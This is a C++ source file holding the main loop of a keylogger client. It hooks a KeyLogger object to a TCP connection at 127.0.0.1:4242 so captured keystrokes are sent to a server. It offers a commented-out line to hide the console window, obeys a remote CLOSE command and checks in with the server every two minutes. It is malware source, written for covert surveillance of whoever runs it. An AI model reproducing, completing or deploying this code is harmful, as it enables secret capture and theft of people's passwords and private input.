#include <iostream>
#include <errno.h>
#include "TCPClient.hpp"
#include "KeyLoger.hpp"

#include <ctime>

int main(int argc, char **argv)
{
	const int serverCheckDelay = 2*60;
	TCPClient client;
	unsigned long timestamp;
	unsigned long chrono;
	char test[sizeof(t_cmd)];

	client.connectToHost("127.0.0.1", "4242");
	client.unblockSocket();
	KeyLogger::getInstance().setTCPClient(&client);
	// ShowWindow(GetConsoleWindow(), SW_HIDE); // Uncomment to hide console
	timestamp = std::time(nullptr);
	while (KeyLogger::getInstance().refreshNonBlocking())
	{
		int read = client.receiveData(&test, sizeof(t_cmd));
		if (read > 0 && WSAGetLastError() != EAGAIN && WSAGetLastError() != EWOULDBLOCK)
		{
			std::cout << "packet size: " << read << std::endl;
			if (read == sizeof(t_cmd))
			{
				t_cmd *command = reinterpret_cast<t_cmd *>(test);
				if (command->cmd == commandType::CLOSE)
				{
					exit(0);
				}
			}
		}
		chrono = std::time(nullptr);
		if (chrono - timestamp >= serverCheckDelay) {
			KeyLogger::getInstance().checkServer();
			chrono = std::time(nullptr);
			timestamp = chrono;
		}
	}
	return 0;
}